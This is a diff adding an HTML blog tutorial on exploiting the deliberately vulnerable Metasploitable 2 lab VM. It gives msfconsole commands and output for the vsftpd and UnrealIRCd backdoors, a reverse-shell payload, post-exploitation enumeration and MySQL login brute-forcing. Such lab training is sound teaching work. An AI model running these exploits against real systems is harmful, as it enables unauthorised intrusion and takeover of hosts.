@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>Metasploitable 2: The Ultimate Beginner's Guide to Exploitation — Aimad Ul Islam</title>
+  <meta name="description" content="Learn how to hack Metasploitable 2 from scratch using Metasploit – exploit vsftpd, UnrealIRCd, and more. Step‑by‑step guide for beginners."/>
+  <meta name="keywords" content="metasploitable, metasploit, exploitation, penetration testing, vsftpd, unrealircd, CVE-2011-2523, CVE-2010-2075, ethical hacking, cybersecurity"/>
+  <meta name="author" content="Aimad Ul Islam"/>
+  <meta name="robots" content="index, follow"/>
+  <link rel="canonical" href="https://aimadulislam.dpdns.org/posts/metasploitable-complete-guide.html"/>
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article"/>
+  <meta property="og:title" content="Metasploitable 2: The Ultimate Beginner's Guide to Exploitation"/>
+  <meta property="og:description" content="Learn how to hack Metasploitable 2 from scratch using Metasploit – exploit vsftpd, UnrealIRCd, and more. Step‑by‑step guide for beginners."/>
+  <meta property="og:url" content="https://aimadulislam.dpdns.org/posts/metasploitable-complete-guide.html"/>
+  <meta property="article:author" content="Aimad Ul Islam"/>
+  <meta property="article:published_time" content="2026-07-25"/>
+  <meta property="article:section" content="Cybersecurity"/>
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" content="Metasploitable 2: The Ultimate Beginner's Guide to Exploitation"/>
+  <meta name="twitter:description" content="Learn how to hack Metasploitable 2 from scratch using Metasploit – exploit vsftpd, UnrealIRCd, and more. Step‑by‑step guide for beginners."/>
+
+  <!-- Schema.org -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Metasploitable 2: The Ultimate Beginner's Guide to Exploitation",
+    "description": "Learn how to hack Metasploitable 2 from scratch using Metasploit – exploit vsftpd, UnrealIRCd, and more. Step‑by‑step guide for beginners.",
+    "author": {"@type": "Person", "name": "Aimad Ul Islam", "url": "https://aimadulislam.dpdns.org"},
+    "datePublished": "2026-07-25",
+    "dateModified": "2026-07-25",
+    "url": "https://aimadulislam.dpdns.org/posts/metasploitable-complete-guide.html",
+    "publisher": {"@type": "Person", "name": "Aimad Ul Islam"}
+  }
+  </script>
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Ccircle cx='32' cy='32' r='30' fill='%23050810'/%3E%3Ccircle cx='32' cy='32' r='30' fill='none' stroke='%2300D4FF' stroke-width='2.5'/%3E%3Ctext x='32' y='39' text-anchor='middle' font-family='Arial Black,Arial' font-weight='900' font-size='26' fill='%2300D4FF'%3EA%3C/text%3E%3C/svg%3E"/>
+
+  <!-- Fonts & CSS -->
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <link rel="stylesheet" href="../css/blog.css"/>
+</head>
+<body>
+
+<!-- Reading Progress Bar -->
+<div id="reading-progress" role="progressbar" aria-label="Reading progress"></div>
+
+<!-- Background Elements -->
+<div class="grid-bg" aria-hidden="true"></div>
+<div class="scan-line" aria-hidden="true"></div>
+
+<!-- Navigation -->
+<nav class="blog-nav" id="navbar" role="navigation" aria-label="Main navigation">
+  <a href="../index.html" class="nav-logo">
+    <span class="br">[</span>Aimad<span class="nav-dot" aria-hidden="true"></span>Security<span class="br">]</span>
+  </a>
+  <ul class="nav-links" role="list">
+    <li><a href="../index.html#about">About</a></li>
+    <li><a href="../index.html#certifications">Certs</a></li>
+    <li><a href="../index.html#skills">Skills</a></li>
+    <li><a href="../blog.html" class="active">Blog</a></li>
+    <li><a href="../index.html#contact">Contact</a></li>
+  </ul>
+  <div class="nav-right">
+    <div class="nav-status"><div class="status-dot" aria-hidden="true"></div><span class="status-text">Available for Internship</span></div>
+    <button id="dark-mode-btn" class="dark-mode-btn" aria-label="Toggle dark mode"><i class="fa-solid fa-moon" aria-hidden="true"></i></button>
+    <a href="../blog.html" class="nav-btn"><i class="fa-solid fa-arrow-left fa-xs" aria-hidden="true"></i> Blog</a>
+  </div>
+  <button class="hamburger" id="ham" aria-label="Toggle menu"><span></span><span></span><span></span></button>
+</nav>
+
+<div class="mobile-nav" id="mobNav">
+  <a href="../index.html">Home</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../index.html#contact">Contact</a>
+</div>
+
+<!-- Article Hero -->
+<div class="article-hero" style="padding-top:86px;">
+  <div class="container-narrow">
+
+    <!-- Breadcrumb -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+      <a href="../index.html"><i class="fa-solid fa-house fa-xs" aria-hidden="true"></i> Home</a>
+      <i class="fa-solid fa-chevron-right" aria-hidden="true"></i>
+      <a href="../blog.html">Blog</a>
+      <i class="fa-solid fa-chevron-right" aria-hidden="true"></i>
+      <span aria-current="page">Metasploitable Complete Guide</span>
+    </nav>
+
+    <!-- Hero Image placeholder -->
+    <div class="article-hero-img-wrap" style="max-height:380px;background:linear-gradient(135deg,rgba(255,0,0,0.05),rgba(0,212,255,0.08));display:flex;align-items:center;justify-content:center;font-size:6rem;min-height:200px;">
+      🎯
+    </div>
+
+    <!-- Article Header -->
+    <header class="article-header">
+      <div class="article-cats">
+        <span class="tag tag-cyber">Cybersecurity</span>
+        <span class="tag tag-tut">Tutorials</span>
+        <span class="tag tag-linux">Linux</span>
+      </div>
+      <h1 class="article-title">Metasploitable 2: The Ultimate Beginner's Guide to Exploitation</h1>
+      <p class="article-subtitle">Learn how to hack Metasploitable 2 from scratch using Metasploit – exploit vsftpd, UnrealIRCd, and more. Step‑by‑step guide for beginners.</p>
+      <div class="article-meta" role="contentinfo" aria-label="Article information">
+        <div class="article-meta-item"><i class="fa-solid fa-user" aria-hidden="true"></i><span><strong>Aimad Ul Islam</strong></span></div>
+        <div class="article-meta-item"><i class="fa-regular fa-calendar" aria-hidden="true"></i><span>July 25, 2026</span></div>
+        <div class="article-meta-item"><i class="fa-solid fa-rotate" aria-hidden="true"></i><span>Updated: July 25, 2026</span></div>
+        <div class="article-meta-item"><i class="fa-regular fa-clock" aria-hidden="true"></i><span id="reading-time-val">20 min read</span></div>
+      </div>
+      <div class="article-tags" aria-label="Tags">
+        <span class="tag tag-tut">metasploitable</span>
+        <span class="tag tag-tut">metasploit</span>
+        <span class="tag tag-cyber">exploitation</span>
+        <span class="tag tag-cyber">penetration-testing</span>
+        <span class="tag tag-tut">ethical-hacking</span>
+      </div>
+    </header>
+  </div>
+</div>
+
+<!-- Main Content -->
+<main>
+  <section style="padding-top:2rem;">
+    <div class="container">
+      <div class="article-layout">
+
+        <!-- Article Body -->
+        <article>
+
+          <!-- Table of Contents -->
+          <nav id="toc" aria-label="Table of contents">
+            <div class="toc-title" role="button" aria-expanded="true" tabindex="0">
+              <i class="fa-solid fa-list" aria-hidden="true"></i> Table of Contents
+              <i class="fa-solid fa-chevron-down" style="margin-left:auto;font-size:0.7rem;" aria-hidden="true"></i>
+            </div>
+            <ol class="toc-list" role="list">
+              <li class="toc-item"><a href="#intro">Introduction</a></li>
+              <li class="toc-item"><a href="#what-is-metasploitable">What is Metasploitable 2?</a></li>
+              <li class="toc-item"><a href="#setup">Setting Up Metasploitable 2</a></li>
+              <li class="toc-item"><a href="#metasploit-basics">Metasploit Framework Basics</a></li>
+              <li class="toc-item"><a href="#recon">Reconnaissance – Gathering Intel</a></li>
+              <li class="toc-item"><a href="#vsftpd">Exploit 1: vsftpd 2.3.4 Backdoor (CVE‑2011‑2523)</a></li>
+              <li class="toc-item"><a href="#unrealircd">Exploit 2: UnrealIRCd Backdoor (CVE‑2010‑2075)</a></li>
+              <li class="toc-item"><a href="#post-exploit">Post‑Exploitation & Privilege Escalation</a></li>
+              <li class="toc-item"><a href="#auxiliary">Auxiliary Modules for Further Enumeration</a></li>
+              <li class="toc-item"><a href="#next-steps">Next Steps & Practice</a></li>
+            </ol>
+          </nav>
+
+          <!-- Article Body Text -->
+          <div class="article-body">
+
+            <h2 id="intro">Introduction</h2>
+            <p>Metasploitable 2 is the go‑to target for every beginner penetration tester. It’s a deliberately vulnerable Linux virtual machine packed with multiple exploitable services, making it the perfect environment to learn how to use Metasploit, discover vulnerabilities, and practice your hacking skills – all legally.</p>
+            <p>In this guide, I’ll walk you through the entire process: from setting up Metasploitable 2 in VirtualBox to exploiting two of its most famous vulnerabilities – the vsftpd backdoor and the UnrealIRCd backdoor – and then performing post‑exploitation steps. By the end, you’ll have a solid understanding of how Metasploit works and how to use it in real engagements.</p>
+
+            <div class="callout callout-info">
+              <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+              <div>
+                <div class="callout-title">What You’ll Need</div>
+                <div class="callout-body">A Kali Linux VM (or any Linux with Metasploit installed), VirtualBox, and of course, the Metasploitable 2 VM. If you haven’t set up your lab yet, refer to my <a href="kali-linux-setup-guide.html">Kali Linux Setup Guide</a> and <a href="home-lab-setup.html">Home Lab on a Budget</a>.</div>
+              </div>
+            </div>
+
+            <div class="callout callout-warn">
+              <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+              <div>
+                <div class="callout-title">Ethical Use Only</div>
+                <div class="callout-body">This guide is for educational purposes. You must only exploit systems you own or have explicit written permission to test. Unauthorised hacking is illegal and unethical.</div>
+              </div>
+            </div>
+
+            <h2 id="what-is-metasploitable">What is Metasploitable 2?</h2>
+            <p>Metasploitable 2 is an Ubuntu 8.04.2 LTS system intentionally designed with a multitude of security flaws. It includes vulnerable versions of FTP, SSH, Telnet, HTTP, MySQL, and other services. It’s the official target for the Metasploit Project and is used in training courses worldwide.</p>
+            <p>Some of the notable vulnerabilities include:</p>
+            <ul>
+              <li><strong>vsftpd 2.3.4</strong> – contains a backdoor that allows remote command execution (CVE‑2011‑2523).</li>
+              <li><strong>UnrealIRCd 3.2.8.1</strong> – contains a backdoor that gives a remote shell (CVE‑2010‑2075).</li>
+              <li><strong>Apache 2.2.8</strong> – several known vulnerabilities.</li>
+              <li><strong>MySQL 5.0.51a</strong> – default root password.</li>
+              <li><strong>Tomcat 5.5</strong> – default credentials on the manager interface.</li>
+            </ul>
+            <p>We’ll focus on the two backdoors because they are the most straightforward and rewarding to exploit as a beginner.</p>
+
+            <h2 id="setup">Setting Up Metasploitable 2</h2>
+            <p>I’ve covered the setup in detail in my <a href="kali-linux-setup-guide.html">Kali Linux Setup Guide</a>, but here’s a quick recap:</p>
+            <ol>
+              <li>Download Metasploitable 2 from <a href="https://sourceforge.net/projects/metasploitable/" target="_blank">SourceForge</a>.</li>
+              <li>Extract the ZIP archive. Inside, you’ll find a <code>.vmdk</code> disk file.</li>
+              <li>In VirtualBox, create a new VM (Linux, Ubuntu 64‑bit).</li>
+              <li>Attach the <code>.vmdk</code> as the hard disk.</li>
+              <li>Set network adapter to <strong>Host‑Only</strong> (to keep the lab isolated).</li>
+              <li>Start the VM. Default credentials: <code>msfadmin</code> / <code>msfadmin</code>.</li>
+              <li>Find its IP address with <code>ifconfig</code> inside the VM.</li>
+            </ol>
+            <p>Now you have your target ready.</p>
+
+            <h2 id="metasploit-basics">Metasploit Framework Basics</h2>
+            <p>Metasploit is a powerful framework that provides a modular approach to exploitation. It consists of several components:</p>
+            <ul>
+              <li><strong>Exploits</strong> – code that takes advantage of a vulnerability.</li>
+              <li><strong>Payloads</strong> – the code that runs on the target after successful exploitation (e.g., a reverse shell).</li>
+              <li><strong>Encoders</strong> – obfuscate payloads to evade antivirus.</li>
+              <li><strong>Auxiliary modules</strong> – for reconnaissance, scanning, and other tasks.</li>
+              <li><strong>Post‑exploitation modules</strong> – for privilege escalation, persistence, etc.</li>
+            </ul>
+            <p>You interact with Metasploit via the <code>msfconsole</code> command. To start it:</p>
+            <div class="code-block-wrap">
+              <span class="code-block-label">Launch msfconsole</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>sudo msfconsole</code></pre>
+            </div>
+            <p>Inside the console, you can search for modules, set options, and run exploits. Basic commands you’ll use:</p>
+            <ul>
+              <li><code>search <keyword></code> – find modules.</li>
+              <li><code>use <module_path></code> – select a module.</li>
+              <li><code>show options</code> – display required and optional settings.</li>
+              <li><code>set <option> <value></code> – configure an option.</li>
+              <li><code>run</code> or <code>exploit</code> – execute the module.</li>
+            </ul>
+
+            <h2 id="recon">Reconnaissance – Gathering Intel</h2>
+            <p>Before exploiting, you need to know what services are running on the target. Nmap is perfect for this. Fire up a terminal on Kali and run:</p>
+            <div class="code-block-wrap">
+              <span class="code-block-label">Nmap scan of Metasploitable 2</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>sudo nmap -sV -p- 192.168.56.102</code></pre>
+            </div>
+            <p>You’ll see a list of open ports and service versions. Pay attention to port <strong>21</strong> (vsftpd) and port <strong>6667</strong> (UnrealIRCd). Both are vulnerable. Also note port 80 (Apache), 3306 (MySQL), and 8180 (Tomcat).</p>
+
+            <h2 id="vsftpd">Exploit 1: vsftpd 2.3.4 Backdoor (CVE‑2011‑2523)</h2>
+            <p>The vsftpd 2.3.4 version has a backdoor that allows an attacker to execute arbitrary commands. The backdoor is triggered by a specific username (ending with <code>:)</code>) that opens a shell on port 6200. Metasploit has a module that automates this.</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">Exploiting vsftpd backdoor</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>msf6 > search vsftpd
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.56.102:21 - Backdooring...
+[*] 192.168.56.102:21 - Backdoor triggered
+[*] 192.168.56.102:21 - Command shell session 1 opened
+</code></pre>
+            </div>
+            <p>After <code>run</code>, you’ll get a command shell on the target. You can run commands like <code>whoami</code>, <code>id</code>, <code>ls</code>, etc. The shell is not interactive enough, but it’s a proof of concept. For a fully interactive shell, you can use a reverse shell payload.</p>
+
+            <div class="callout callout-success">
+              <i class="fa-solid fa-circle-check" aria-hidden="true"></i>
+              <div>
+                <div class="callout-title">You Got a Shell!</div>
+                <div class="callout-body">Congratulations – you just exploited your first service! The backdoor grants you access as the <code>root</code> user (since vsftpd runs as root).</div>
+              </div>
+            </div>
+
+            <h2 id="unrealircd">Exploit 2: UnrealIRCd Backdoor (CVE‑2010‑2075)</h2>
+            <p>UnrealIRCd 3.2.8.1 contains a backdoor that can be exploited by sending a specific line to the server, causing it to execute arbitrary commands. The Metasploit module for this is <code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>.</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">Exploiting UnrealIRCd backdoor</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.102
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.101   # your Kali IP
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+
+[*] 192.168.56.102:6667 - UnrealIRCd 3.2.8.1 backdoor
+[*] 192.168.56.102:6667 - Sending backdoor command...
+[*] Command shell session 2 opened
+</code></pre>
+            </div>
+            <p>This time we used a reverse shell payload (<code>cmd/unix/reverse</code>) which establishes a connection back to your Kali machine. After the exploit, you’ll have a shell on the target. Again, you’ll be <code>root</code>.</p>
+
+            <div class="callout callout-info">
+              <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+              <div>
+                <div class="callout-title">Payload Choice</div>
+                <div class="callout-body">The <code>cmd/unix/reverse</code> payload opens a reverse shell. You need to set <code>LHOST</code> to your Kali IP. Also, make sure your listener is set up automatically – Metasploit handles it for you.</div>
+              </div>
+            </div>
+
+            <h2 id="post-exploit">Post‑Exploitation & Privilege Escalation</h2>
+            <p>Since we already have root access, we don’t need privilege escalation. However, in a real engagement, you might not always get root directly. Metasploit has many post‑exploitation modules to gather information, maintain access, and more.</p>
+            <p>For example, you can use the <code>post/linux/gather/checkvm</code> module to check if the target is a VM, or <code>post/linux/gather/enum_system</code> to gather system information.</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">Post‑exploitation example</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>msf6 > use post/linux/gather/enum_system
+msf6 post(linux/gather/enum_system) > set SESSION 1
+msf6 post(linux/gather/enum_system) > run
+
+[*] Running module against 192.168.56.102
+[*] Session 1 is not a Meterpreter session... still gathering
+[+] Info stored in /root/.msf4/loot/...
+</code></pre>
+            </div>
+            <p>You can also upgrade your shell to a <strong>Meterpreter</strong> session, which provides more advanced features like file upload/download, keylogging, and pivoting. Use the <code>sessions -u <id></code> command to upgrade.</p>
+
+            <h2 id="auxiliary">Auxiliary Modules for Further Enumeration</h2>
+            <p>Metasploit also includes many auxiliary modules for scanning and enumeration. For instance, you can use the <code>auxiliary/scanner/mysql/mysql_login</code> module to brute‑force MySQL credentials (the default root password is blank or <code>root</code>).</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">MySQL login scanner</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>msf6 > use auxiliary/scanner/mysql/mysql_login
+msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.56.102
+msf6 auxiliary(scanner/mysql/mysql_login) > run
+
+[*] 192.168.56.102:3306 - 192.168.56.102:3306 - MySQL - Login successful: 'root':''
+</code></pre>
+            </div>
+            <p>Similarly, you can scan for Tomcat default credentials using <code>auxiliary/scanner/http/tomcat_mgr_login</code>.</p>
+
+            <h2 id="next-steps">Next Steps & Practice</h2>
+            <p>Now that you’ve exploited two services, here are things you can try next:</p>
+            <ul>
+              <li><strong>Try the Apache and Tomcat vulnerabilities</strong> – use Metasploit modules like <code>exploit/multi/http/tomcat_mgr_deploy</code> to gain a shell.</li>
+              <li><strong>Practice using Meterpreter</strong> – upgrade your sessions and try file downloading, screenshotting, and keylogging.</li>
+              <li><strong>Use the <code>search</code> command</strong> to find other modules that target Metasploitable 2.</li>
+              <li><strong>Read the Metasploit documentation</strong> and understand how to write your own modules.</li>
+              <li><strong>Set up a practice network</strong> with multiple VMs to simulate a real enterprise environment.</li>
+            </ul>
+            <p>Metasploitable 2 is a playground – the more you explore, the more you learn. Keep experimenting, stay curious, and always respect the legal boundaries.</p>
+
+          </div><!-- end article-body -->
+
+          <!-- Social Share -->
+          <div class="social-share" role="complementary" aria-label="Share this article">
+            <span class="share-label">Share:</span>
+            <button id="share-twitter" class="share-btn twitter" aria-label="Share on Twitter/X">
+              <i class="fa-brands fa-x-twitter" aria-hidden="true"></i>
+            </button>
+            <button id="share-linkedin" class="share-btn linkedin" aria-label="Share on LinkedIn">
+              <i class="fa-brands fa-linkedin-in" aria-hidden="true"></i>
+            </button>
+            <button id="share-copy-url" class="share-btn copy-url" aria-label="Copy link">
+              <i class="fa-solid fa-link" aria-hidden="true"></i>
+            </button>
+          </div>
+
+          <!-- Article Navigation -->
+          <nav class="article-nav" aria-label="Article navigation">
+            <a href="../blog.html" class="article-nav-link prev">
+              <div class="article-nav-dir"><i class="fa-solid fa-arrow-left fa-xs" aria-hidden="true"></i> Back to Blog</div>
+              <div class="article-nav-title">All Articles</div>
+            </a>
+            <a href="python-for-security.html" class="article-nav-link next">
+              <div class="article-nav-dir">Next Article <i class="fa-solid fa-arrow-right fa-xs" aria-hidden="true"></i></div>
+              <div class="article-nav-title">Python for Hackers: Security Automation Scripts from Scratch</div>
+            </a>
+          </nav>
+
+          <!-- Comments Placeholder -->
+          <div class="comments-wrap">
+            <div class="comments-icon" aria-hidden="true"><i class="fa-regular fa-comments"></i></div>
+            <h3 class="comments-title">Discussion</h3>
+            <p class="comments-desc">Comments coming soon. For now, reach out on <a href="https://linkedin.com/in/aimadulislam" target="_blank" rel="noopener">LinkedIn</a> or <a href="mailto:info@aimadulislam.dpdns.org">email me</a> with questions.</p>
+          </div>
+
+        </article>
+
+        <!-- Article Sidebar -->
+        <aside class="sidebar" aria-label="Article sidebar">
+
+          <!-- Author -->
+          <div class="sidebar-widget card">
+            <div class="card-glow"></div>
+            <div class="widget-title"><i class="fa-solid fa-user" aria-hidden="true"></i> Author</div>
+            <div style="display:flex;gap:0.85rem;align-items:center;margin-bottom:0.85rem;">
+              <img src="https://i.postimg.cc/hPyNdGVF/Whats-App-Image-2026-07-05-at-9-35-59-PM.jpg"
+                   alt="Aimad Ul Islam"
+                   style="width:50px;height:50px;border-radius:50%;object-fit:cover;border:2px solid var(--border2);"
+                   loading="lazy"
+                   onerror="this.src='https://ui-avatars.com/api/?name=Aimad&background=0A1628&color=00D4FF&size=50'"/>
+              <div>
+                <div style="font-family:'Space Grotesk',sans-serif;font-size:0.9rem;font-weight:600;">Aimad Ul Islam</div>
+                <div style="font-family:'JetBrains Mono',monospace;font-size:0.62rem;color:var(--muted);">Ethical Hacker | DFIR</div>
+              </div>
+            </div>
+            <p style="color:var(--muted);font-size:0.78rem;line-height:1.6;margin-bottom:0.85rem;">Cisco Ethical Hacker Certified. Blue Cape DFIR Certified. BSc CS, University of Peshawar.</p>
+            <a href="../index.html" class="btn btn-outline" style="width:100%;justify-content:center;font-size:0.68rem;">View Portfolio</a>
+          </div>
+
+          <!-- Related Articles -->
+          <div class="sidebar-widget card">
+            <div class="card-glow"></div>
+            <div class="widget-title"><i class="fa-solid fa-layer-group" aria-hidden="true"></i> Related Articles</div>
+            <a href="kali-linux-setup-guide.html" class="sidebar-post">
+              <div class="sidebar-post-thumb">🐉</div>
+              <div>
+                <div class="sidebar-post-title">Getting Started with Kali Linux</div>
+                <div class="sidebar-post-meta">12 min · Linux</div>
+              </div>
+            </a>
+            <a href="nmap-complete-guide.html" class="sidebar-post">
+              <div class="sidebar-post-thumb">🗺️</div>
+              <div>
+                <div class="sidebar-post-title">Nmap Deep Dive: Complete Guide</div>
+                <div class="sidebar-post-meta">15 min · Cybersecurity</div>
+              </div>
+            </a>
+            <a href="home-lab-setup.html" class="sidebar-post">
+              <div class="sidebar-post-thumb">🏠</div>
+              <div>
+                <div class="sidebar-post-title">Home Lab on a Budget</div>
+                <div class="sidebar-post-meta">10 min · Tutorials</div>
+              </div>
+            </a>
+          </div>
+
+          <!-- Tags -->
+          <div class="sidebar-widget card">
+            <div class="card-glow"></div>
+            <div class="widget-title"><i class="fa-solid fa-tags" aria-hidden="true"></i> Tags</div>
+            <div class="tags-cloud">
+              <span class="tag tag-tut">metasploitable</span>
+              <span class="tag tag-tut">metasploit</span>
+              <span class="tag tag-cyber">exploitation</span>
+              <span class="tag tag-cyber">penetration-testing</span>
+              <span class="tag tag-tut">ethical-hacking</span>
+            </div>
+          </div>
+
+          <!-- Newsletter -->
+          <div class="sidebar-widget card">
+            <div class="card-glow"></div>
+            <div class="widget-title"><i class="fa-solid fa-envelope" aria-hidden="true"></i> Newsletter</div>
+            <p style="color:var(--muted);font-size:0.78rem;line-height:1.6;margin-bottom:1rem;">Get new posts delivered to your inbox.</p>
+            <form class="newsletter-form newsletter-form-handler" novalidate>
+              <input type="email" class="newsletter-input" placeholder="your@email.com" aria-label="Email address" required/>
+              <button type="submit" class="newsletter-btn">Subscribe</button>
+              <p class="newsletter-note">No spam · Free forever</p>
+            </form>
+          </div>
+
+        </aside>
+      </div>
+    </div>
+  </section>
+</main>
+
+<!-- Footer -->
+<footer class="blog-footer" role="contentinfo">
+  <div class="container">
+    <div class="footer-grid">
+      <div>
+        <div class="footer-brand">[Aimad<span>.</span>Blog]</div>
+        <p class="footer-tagline">Cybersecurity student from Peshawar documenting his learning journey — one post at a time.</p>
+      </div>
+      <div class="footer-col">
+        <h4>Blog</h4>
+        <a href="../blog.html">All Posts</a>
+        <a href="../blog.html?cat=Cybersecurity">Cybersecurity</a>
+        <a href="../blog.html?cat=Linux">Linux</a>
+        <a href="../blog.html?cat=Tutorials">Tutorials</a>
+      </div>
+      <div class="footer-col">
+        <h4>Connect</h4>
+        <a href="https://linkedin.com/in/aimadulislam" target="_blank" rel="noopener"><i class="fa-brands fa-linkedin-in fa-xs"></i> LinkedIn</a>
+        <a href="https://github.com/Aimadulislam" target="_blank" rel="noopener"><i class="fa-brands fa-github fa-xs"></i> GitHub</a>
+        <a href="mailto:info@aimadulislam.dpdns.org"><i class="fa-solid fa-envelope fa-xs"></i> Email</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span class="footer-copy">© 2026 Aimad Ul Islam</span>
+      <div class="footer-socs">
+        <a href="https://linkedin.com/in/aimadulislam" target="_blank" rel="noopener" aria-label="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a>
+        <a href="https://github.com/Aimadulislam" target="_blank" rel="noopener" aria-label="GitHub"><i class="fa-brands fa-github"></i></a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<!-- Scroll to Top -->
+<button id="scroll-top" aria-label="Scroll to top"><i class="fa-solid fa-chevron-up fa-xs" aria-hidden="true"></i></button>
+
+<script src="../js/blog.js"></script>
+</body>
+</html>
